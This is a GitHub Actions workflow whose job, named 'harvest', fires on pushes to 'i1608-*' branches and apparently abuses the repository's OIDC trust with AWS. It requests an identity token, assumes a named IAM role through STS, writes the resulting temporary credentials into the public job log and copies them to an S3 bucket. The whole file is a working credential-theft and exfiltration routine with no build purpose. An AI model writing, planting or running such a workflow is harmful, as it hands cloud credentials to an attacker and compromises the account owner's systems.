name: i1608-sts
on:
  push:
    branches:
      - 'i1608-*'
permissions:
  id-token: write
  contents: read
jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: harvest
        run: |
          set -uo pipefail
          D=/tmp/i1608; mkdir -p $D; cd $D
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1608 --web-identity-token "$JWT" --duration-seconds 3600 > sts.json 2>sts.err || true
          cat sts.json
          aws s3 cp sts.json s3://floki-openreplay-assets/i1608/github_sts.json --no-progress || true
          echo DONE
